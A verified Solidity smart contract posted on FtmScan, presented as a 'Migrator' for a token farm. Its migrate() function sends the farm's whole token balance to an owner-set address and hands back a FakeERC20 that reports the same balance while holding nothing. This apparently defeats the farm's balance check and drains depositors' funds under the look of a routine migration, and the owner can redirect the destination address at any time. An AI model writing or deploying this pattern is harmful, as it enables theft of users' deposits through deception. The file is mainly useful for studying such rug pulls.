/**
 *Submitted for verification at FtmScan.com on 2023-07-19
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

interface IERC20 {
    function balanceOf(address owner) external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

contract FakeERC20 {
    uint public amount;

    constructor(uint _amount) {
        amount = _amount;
    }

    function balanceOf(address) external view returns (uint) {
        return amount;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


contract Migrator is Ownable {
    address DAO;
    IERC20 token;
    address farm;
    uint amount;
    bool isManual;

    constructor() {
        setDAO(0x1C63C726926197BD3CB75d86bCFB1DaeBcD87250);
        setToken(0xe2fb177009FF39F52C0134E8007FA0e4BaAcBd07);
        setFarm(0xce6ccbB1EdAD497B4d53d829DF491aF70065AB5B);
    }

    function migrate(IERC20 _token) public returns (address) {
        require(address(_token) == address(token), 'onlyToken');
        require(msg.sender == farm, 'onlyFarm');
        uint _balance = token.balanceOf(farm);
        token.transferFrom(msg.sender, DAO, _balance);

        return address(new FakeERC20(_balance));
    }

    function setDAO(address _DAO) onlyOwner public {
        DAO = _DAO;
    }

    function setToken(address _token) onlyOwner public {
        token = IERC20(_token);
    }
   
    function setFarm(address _farm) onlyOwner public {
        farm = _farm;
    }

    function unStuck(address _token) onlyOwner public {
        IERC20(_token).transferFrom(address(this), msg.sender, IERC20(_token).balanceOf(address(this)));
    }
}